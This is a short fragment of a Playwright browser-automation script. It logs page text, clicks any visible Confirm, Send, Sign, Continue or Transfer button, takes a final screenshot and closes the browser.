let t=(await p.innerText('body').catch(()=>'')).replace(/\s+/g,' ')
console.log('after Start:', t.slice(0,300))
// there may be a further confirm/sign step
for (const label of [/^Confirm$/i,/^Send$/i,/^Sign$/i,/^Continue$/i,/^Transfer$/i]) {
  const btn=p.locator('button',{hasText:label}).first()
  if (await btn.isVisible().catch(()=>false)) {
    console.log('  clicking follow-up button:', label)
    await btn.click().catch(()=>{}); await p.waitForTimeout(12000)
  }
}
await p.screenshot({path:`${OUT}/08-final.png`})
t=(await p.innerText('body').catch(()=>'')).replace(/\s+/g,' ')
console.log('final:', t.slice(0,320))
await b.close()
```
